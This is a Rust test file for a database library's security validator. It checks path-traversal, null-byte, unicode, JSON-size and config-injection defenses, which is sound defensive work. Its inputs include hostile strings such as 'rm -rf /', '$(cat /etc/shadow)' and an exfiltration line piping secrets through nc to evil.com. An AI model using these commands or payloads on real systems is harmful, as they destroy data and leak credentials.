//! Security validation tests for sinex-db
//!
//! Tests all public functions in `sinex_db::security`:
//! - `SecurityValidator::sanitize_path`
//! - `SecurityValidator::sanitize_unicode`
//! - `SecurityValidator::check_json_depth`
//! - `SecurityValidator::check_json_size`
//! - `SecurityValidator::validate_config_content`
//! - `SecurityValidator::sanitize_config_value`
//! - `SecurityValidator::sanitize_config_path`

use serde_json::json;
use sinex_db::security::{SecurityError, SecurityValidator};
use std::borrow::Cow;
use xtask::sandbox::prelude::*;

// =============================================================================
// sanitize_path
// =============================================================================

#[sinex_test]
async fn sanitize_path_clean_relative_path() -> TestResult<()> {
    let result = SecurityValidator::sanitize_path("data/files/document.txt")?;
    assert_eq!(result.as_ref(), "data/files/document.txt");
    Ok(())
}

#[sinex_test]
async fn sanitize_path_with_legitimate_dots() -> TestResult<()> {
    let result = SecurityValidator::sanitize_path("file.txt")?;
    assert_eq!(result.as_ref(), "file.txt");

    let result = SecurityValidator::sanitize_path("dir.name/file.ext")?;
    assert_eq!(result.as_ref(), "dir.name/file.ext");

    let result = SecurityValidator::sanitize_path("some.dir/another.dir/file.tar.gz")?;
    assert_eq!(result.as_ref(), "some.dir/another.dir/file.tar.gz");

    Ok(())
}

#[sinex_test]
async fn sanitize_path_rejects_dot_dot_slash() -> TestResult<()> {
    let result = SecurityValidator::sanitize_path("../etc/passwd");
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::PathTraversal(_))));
    Ok(())
}

#[sinex_test]
async fn sanitize_path_rejects_backslash_traversal() -> TestResult<()> {
    let result = SecurityValidator::sanitize_path("..\\etc\\passwd");
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::PathTraversal(_))));
    Ok(())
}

#[sinex_test]
async fn sanitize_path_rejects_embedded_traversal() -> TestResult<()> {
    let result = SecurityValidator::sanitize_path("some/dir/../../etc/passwd");
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::PathTraversal(_))));
    Ok(())
}

#[sinex_test]
async fn sanitize_path_rejects_null_byte() -> TestResult<()> {
    let result = SecurityValidator::sanitize_path("file\0.txt");
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::NullByteInjection)));
    Ok(())
}

#[sinex_test]
async fn sanitize_path_rejects_null_byte_before_traversal() -> TestResult<()> {
    let result = SecurityValidator::sanitize_path("data\0/../etc/passwd");
    assert!(result.is_err());
    // Null byte detected first
    assert!(matches!(result, Err(SecurityError::NullByteInjection)));
    Ok(())
}

#[sinex_test]
async fn sanitize_path_rejects_url_encoded_traversal() -> TestResult<()> {
    let result = SecurityValidator::sanitize_path("%2e%2e%2fetc/passwd");
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::PathTraversal(_))));
    Ok(())
}

#[sinex_test]
async fn sanitize_path_rejects_double_url_encoded_traversal() -> TestResult<()> {
    let result = SecurityValidator::sanitize_path("%252e%252e%252f");
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::PathTraversal(_))));
    Ok(())
}

#[sinex_test]
async fn sanitize_path_rejects_mixed_encoding_traversal() -> TestResult<()> {
    let result = SecurityValidator::sanitize_path("..%2f");
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::PathTraversal(_))));
    Ok(())
}

#[sinex_test]
async fn sanitize_path_rejects_utf8_overlong_encoding() -> TestResult<()> {
    // ..%c0%af is a classic overlong UTF-8 encoding for ../
    let result = SecurityValidator::sanitize_path("..%c0%af");
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::PathTraversal(_))));
    Ok(())
}

#[sinex_test]
async fn sanitize_path_empty_string() -> TestResult<()> {
    // Empty path should pass through without error
    let result = SecurityValidator::sanitize_path("");
    assert!(result.is_ok());
    Ok(())
}

#[sinex_test]
async fn sanitize_path_simple_filename() -> TestResult<()> {
    let result = SecurityValidator::sanitize_path("readme.md")?;
    assert_eq!(result.as_ref(), "readme.md");
    Ok(())
}

// =============================================================================
// sanitize_unicode
// =============================================================================

#[sinex_test]
async fn sanitize_unicode_normal_ascii() -> TestResult<()> {
    let input = "Hello, World!";
    let result = SecurityValidator::sanitize_unicode(input);
    // Normal ASCII should borrow (zero-alloc)
    assert!(matches!(result, Cow::Borrowed(_)));
    assert_eq!(result.as_ref(), input);
    Ok(())
}

#[sinex_test]
async fn sanitize_unicode_normal_unicode_passthrough() -> TestResult<()> {
    // Accented characters, CJK, etc. should pass through
    let input = "cafe\u{0301} \u{4e16}\u{754c} \u{00fc}ber";
    let result = SecurityValidator::sanitize_unicode(input);
    assert!(matches!(result, Cow::Borrowed(_)));
    assert_eq!(result.as_ref(), input);
    Ok(())
}

#[sinex_test]
async fn sanitize_unicode_strips_null_bytes() -> TestResult<()> {
    let input = "hello\0world";
    let result = SecurityValidator::sanitize_unicode(input);
    assert!(matches!(result, Cow::Owned(_)));
    assert_eq!(result.as_ref(), "helloworld");
    Ok(())
}

#[sinex_test]
async fn sanitize_unicode_strips_multiple_null_bytes() -> TestResult<()> {
    let input = "\0a\0b\0c\0";
    let result = SecurityValidator::sanitize_unicode(input);
    assert!(matches!(result, Cow::Owned(_)));
    assert_eq!(result.as_ref(), "abc");
    Ok(())
}

#[sinex_test]
async fn sanitize_unicode_detects_rtl_override() -> TestResult<()> {
    // U+202E Right-to-left override
    let input = "normal\u{202E}reversed";
    let result = SecurityValidator::sanitize_unicode(input);
    // The function returns Borrowed — it detects but doesn't strip these characters
    assert!(matches!(result, Cow::Borrowed(_)));
    Ok(())
}

#[sinex_test]
async fn sanitize_unicode_detects_zero_width_space() -> TestResult<()> {
    // U+200B Zero-width space
    let input = "hello\u{200B}world";
    let result = SecurityValidator::sanitize_unicode(input);
    assert!(matches!(result, Cow::Borrowed(_)));
    Ok(())
}

#[sinex_test]
async fn sanitize_unicode_detects_bom() -> TestResult<()> {
    // U+FEFF Byte order mark / Zero-width no-break space
    let input = "\u{FEFF}content";
    let result = SecurityValidator::sanitize_unicode(input);
    assert!(matches!(result, Cow::Borrowed(_)));
    Ok(())
}

#[sinex_test]
async fn sanitize_unicode_empty_string() -> TestResult<()> {
    let result = SecurityValidator::sanitize_unicode("");
    assert!(matches!(result, Cow::Borrowed(_)));
    assert_eq!(result.as_ref(), "");
    Ok(())
}

// =============================================================================
// check_json_depth
// =============================================================================

#[sinex_test]
async fn check_json_depth_flat_object_passes() -> TestResult<()> {
    let value = json!({"key": "value", "number": 42});
    SecurityValidator::check_json_depth(&value, 10)?;
    Ok(())
}

#[sinex_test]
async fn check_json_depth_flat_array_passes() -> TestResult<()> {
    let value = json!([1, 2, 3, 4, 5]);
    SecurityValidator::check_json_depth(&value, 10)?;
    Ok(())
}

#[sinex_test]
async fn check_json_depth_scalar_passes() -> TestResult<()> {
    let value = json!("just a string");
    SecurityValidator::check_json_depth(&value, 1)?;
    Ok(())
}

#[sinex_test]
async fn check_json_depth_null_passes() -> TestResult<()> {
    let value = json!(null);
    SecurityValidator::check_json_depth(&value, 1)?;
    Ok(())
}

#[sinex_test]
async fn check_json_depth_nested_within_limit() -> TestResult<()> {
    // 3 levels deep: object -> object -> value
    let value = json!({"a": {"b": {"c": "deep"}}});
    SecurityValidator::check_json_depth(&value, 5)?;
    Ok(())
}

#[sinex_test]
async fn check_json_depth_exceeds_limit_objects() -> TestResult<()> {
    // Build deeply nested object
    let mut value = json!("leaf");
    for _ in 0..20 {
        value = json!({"nested": value});
    }
    let result = SecurityValidator::check_json_depth(&value, 10);
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::ResourceLimit(_))));
    Ok(())
}

#[sinex_test]
async fn check_json_depth_exceeds_limit_arrays() -> TestResult<()> {
    // Build deeply nested array
    let mut value = json!("leaf");
    for _ in 0..20 {
        value = json!([value]);
    }
    let result = SecurityValidator::check_json_depth(&value, 10);
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::ResourceLimit(_))));
    Ok(())
}

#[sinex_test]
async fn check_json_depth_exactly_at_limit() -> TestResult<()> {
    // Build exactly max_depth levels of nesting
    let max_depth = 5;
    let mut value = json!("leaf");
    for _ in 0..max_depth {
        value = json!({"n": value});
    }
    // At depth = max_depth, should pass (depth 0..=max_depth, child at max_depth+1 exceeds)
    // The function checks current_depth > max, so depth exactly equal to max passes
    let result = SecurityValidator::check_json_depth(&value, max_depth);
    assert!(result.is_ok());
    Ok(())
}

#[sinex_test]
async fn check_json_depth_mixed_nesting() -> TestResult<()> {
    let value = json!({"a": [{"b": [{"c": "deep"}]}]});
    // This has depth: obj(0) -> arr(1) -> obj(2) -> arr(3) -> obj(4) -> str(5)
    // At max_depth=4, depth 5 > 4, so it should fail
    let result = SecurityValidator::check_json_depth(&value, 4);
    assert!(result.is_err());

    // At max_depth=5, depth 5 is at the limit, passes
    SecurityValidator::check_json_depth(&value, 5)?;
    Ok(())
}

// =============================================================================
// check_json_size
// =============================================================================

#[sinex_test]
async fn check_json_size_small_object_passes() -> TestResult<()> {
    let value = json!({"key": "value"});
    SecurityValidator::check_json_size(&value, 100)?;
    Ok(())
}

#[sinex_test]
async fn check_json_size_empty_object_passes() -> TestResult<()> {
    let value = json!({});
    SecurityValidator::check_json_size(&value, 10)?;
    Ok(())
}

#[sinex_test]
async fn check_json_size_exceeds_element_count() -> TestResult<()> {
    // Create an object with many elements
    let mut map = serde_json::Map::new();
    for i in 0..50 {
        map.insert(format!("key{i}"), json!(i));
    }
    let value = serde_json::Value::Object(map);
    // 50 child values + 1 root object = 51 elements, limit at 10
    let result = SecurityValidator::check_json_size(&value, 10);
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::ResourceLimit(_))));
    Ok(())
}

#[sinex_test]
async fn check_json_size_large_array() -> TestResult<()> {
    let value: serde_json::Value = (0..100).map(|i| json!(i)).collect::<Vec<_>>().into();
    // 100 elements + 1 root array = 101
    let result = SecurityValidator::check_json_size(&value, 50);
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::ResourceLimit(_))));
    Ok(())
}

#[sinex_test]
async fn check_json_size_within_limit() -> TestResult<()> {
    let value = json!({"a": 1, "b": 2, "c": 3});
    // 3 values + 1 root = 4 elements
    SecurityValidator::check_json_size(&value, 10)?;
    Ok(())
}

#[sinex_test]
async fn check_json_size_scalar_is_one_element() -> TestResult<()> {
    let value = json!(42);
    SecurityValidator::check_json_size(&value, 1)?;
    Ok(())
}

// =============================================================================
// validate_config_content
// =============================================================================

#[sinex_test]
async fn validate_config_content_clean_toml() -> TestResult<()> {
    let content = r#"
[database]
url = "postgres://localhost:5432/sinex"
max_connections = 10

[nats]
url = "nats://localhost:4222"
"#;
    SecurityValidator::validate_config_content(content)?;
    Ok(())
}

#[sinex_test]
async fn validate_config_content_rejects_rm_rf() -> TestResult<()> {
    let content = "key = \"value\"; rm -rf /";
    let result = SecurityValidator::validate_config_content(content);
    assert!(result.is_err());
    Ok(())
}

#[sinex_test]
async fn validate_config_content_rejects_and_rm() -> TestResult<()> {
    let content = "cmd = \"echo hello && rm important_file\"";
    let result = SecurityValidator::validate_config_content(content);
    assert!(result.is_err());
    Ok(())
}

#[sinex_test]
async fn validate_config_content_rejects_pipe_nc() -> TestResult<()> {
    let content = "cmd = \"cat secrets | nc evil.com 1234\"";
    let result = SecurityValidator::validate_config_content(content);
    assert!(result.is_err());
    Ok(())
}

#[sinex_test]
async fn validate_config_content_rejects_backtick_cat() -> TestResult<()> {
    let content = "value = \"`cat /etc/passwd`\"";
    let result = SecurityValidator::validate_config_content(content);
    assert!(result.is_err());
    Ok(())
}

#[sinex_test]
async fn validate_config_content_rejects_dollar_paren_cat() -> TestResult<()> {
    let content = "value = \"$(cat /etc/shadow)\"";
    let result = SecurityValidator::validate_config_content(content);
    assert!(result.is_err());
    Ok(())
}

#[sinex_test]
async fn validate_config_content_rejects_etc_passwd_traversal() -> TestResult<()> {
    let content = "path = \"../../../etc/passwd\"";
    let result = SecurityValidator::validate_config_content(content);
    assert!(result.is_err());
    Ok(())
}

#[sinex_test]
async fn validate_config_content_rejects_null_byte() -> TestResult<()> {
    let content = "value = \"hello\x00world\"";
    let result = SecurityValidator::validate_config_content(content);
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::NullByteInjection)));
    Ok(())
}

#[sinex_test]
async fn validate_config_content_rejects_redos_pattern_plus() -> TestResult<()> {
    let content = "regex = \"(a+)+\"";
    let result = SecurityValidator::validate_config_content(content);
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::ResourceLimit(_))));
    Ok(())
}

#[sinex_test]
async fn validate_config_content_rejects_redos_pattern_star() -> TestResult<()> {
    let content = "regex = \"(a*)*\"";
    let result = SecurityValidator::validate_config_content(content);
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::ResourceLimit(_))));
    Ok(())
}

#[sinex_test]
async fn validate_config_content_rejects_toml_bomb() -> TestResult<()> {
    // Generate content with > 50 section headers
    use std::fmt::Write;
    let sections = (0..55).fold(String::new(), |mut acc, i| {
        write!(acc, "[section{i}]\nkey = \"value\"\n").unwrap();
        acc
    });
    let result = SecurityValidator::validate_config_content(&sections);
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::ResourceLimit(_))));
    Ok(())
}

#[sinex_test]
async fn validate_config_content_allows_reasonable_sections() -> TestResult<()> {
    // 5 sections is fine
    let sections = (0..5).fold(String::new(), |mut acc, i| {
        use std::fmt::Write;
        write!(acc, "[section{i}]\nkey = \"value\"\n").unwrap();
        acc
    });
    SecurityValidator::validate_config_content(&sections)?;
    Ok(())
}

#[sinex_test]
async fn validate_config_content_rejects_control_chars() -> TestResult<()> {
    // SOH (U+0001)
    let content = "value = \"hello\x01world\"";
    let result = SecurityValidator::validate_config_content(content);
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::NullByteInjection)));
    Ok(())
}

#[sinex_test]
async fn validate_config_content_rejects_bom() -> TestResult<()> {
    // U+FEFF Zero-width no-break space (BOM)
    let content = "\u{FEFF}[settings]\nkey = \"value\"";
    let result = SecurityValidator::validate_config_content(content);
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::NullByteInjection)));
    Ok(())
}

// =============================================================================
// sanitize_config_value
// =============================================================================

#[sinex_test]
async fn sanitize_config_value_clean_string() -> TestResult<()> {
    let result = SecurityValidator::sanitize_config_value("hello-world_123");
    assert_eq!(result, "hello-world_123");
    Ok(())
}

#[sinex_test]
async fn sanitize_config_value_allows_path_chars() -> TestResult<()> {
    let result = SecurityValidator::sanitize_config_value("/usr/local/bin/app");
    assert_eq!(result, "/usr/local/bin/app");
    Ok(())
}

#[sinex_test]
async fn sanitize_config_value_allows_key_value_format() -> TestResult<()> {
    let result = SecurityValidator::sanitize_config_value("key=value,other=data");
    assert_eq!(result, "key=value,other=data");
    Ok(())
}

#[sinex_test]
async fn sanitize_config_value_strips_backticks() -> TestResult<()> {
    let result = SecurityValidator::sanitize_config_value("`rm -rf /`");
    // Backticks are removed, but allowed chars remain
    assert!(!result.contains('`'));
    Ok(())
}

#[sinex_test]
async fn sanitize_config_value_strips_dollar_paren() -> TestResult<()> {
    let result = SecurityValidator::sanitize_config_value("$(whoami)");
    assert!(!result.contains('$'));
    assert!(!result.contains('('));
    assert!(!result.contains(')'));
    Ok(())
}

#[sinex_test]
async fn sanitize_config_value_strips_pipe() -> TestResult<()> {
    let result = SecurityValidator::sanitize_config_value("echo hello | cat");
    assert!(!result.contains('|'));
    Ok(())
}

#[sinex_test]
async fn sanitize_config_value_strips_semicolon() -> TestResult<()> {
    let result = SecurityValidator::sanitize_config_value("cmd; rm -rf /");
    assert!(!result.contains(';'));
    Ok(())
}

#[sinex_test]
async fn sanitize_config_value_preserves_spaces() -> TestResult<()> {
    let result = SecurityValidator::sanitize_config_value("hello world");
    assert_eq!(result, "hello world");
    Ok(())
}

#[sinex_test]
async fn sanitize_config_value_trims_whitespace() -> TestResult<()> {
    let result = SecurityValidator::sanitize_config_value("  hello  ");
    assert_eq!(result, "hello");
    Ok(())
}

#[sinex_test]
async fn sanitize_config_value_preserves_dots_and_colons() -> TestResult<()> {
    let result = SecurityValidator::sanitize_config_value("localhost:5432");
    assert_eq!(result, "localhost:5432");

    let result = SecurityValidator::sanitize_config_value("file.tar.gz");
    assert_eq!(result, "file.tar.gz");
    Ok(())
}

#[sinex_test]
async fn sanitize_config_value_empty_string() -> TestResult<()> {
    let result = SecurityValidator::sanitize_config_value("");
    assert_eq!(result, "");
    Ok(())
}

// =============================================================================
// sanitize_config_path
// =============================================================================

#[sinex_test]
async fn sanitize_config_path_clean_path() -> TestResult<()> {
    let result = SecurityValidator::sanitize_config_path("data/config/app.toml")?;
    assert_eq!(result, "data/config/app.toml");
    Ok(())
}

#[sinex_test]
async fn sanitize_config_path_rejects_traversal() -> TestResult<()> {
    let result = SecurityValidator::sanitize_config_path("../../../etc/passwd");
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::PathTraversal(_))));
    Ok(())
}

#[sinex_test]
async fn sanitize_config_path_rejects_null_bytes() -> TestResult<()> {
    let result = SecurityValidator::sanitize_config_path("config\0.toml");
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::NullByteInjection)));
    Ok(())
}

#[sinex_test]
async fn sanitize_config_path_rejects_encoded_traversal() -> TestResult<()> {
    let result = SecurityValidator::sanitize_config_path("%2e%2e/etc/passwd");
    assert!(result.is_err());
    assert!(matches!(result, Err(SecurityError::PathTraversal(_))));
    Ok(())
}

#[sinex_test]
async fn sanitize_config_path_returns_owned_string() -> TestResult<()> {
    let result = SecurityValidator::sanitize_config_path("simple/path")?;
    // sanitize_config_path returns String, not Cow
    let _: String = result;
    Ok(())
}
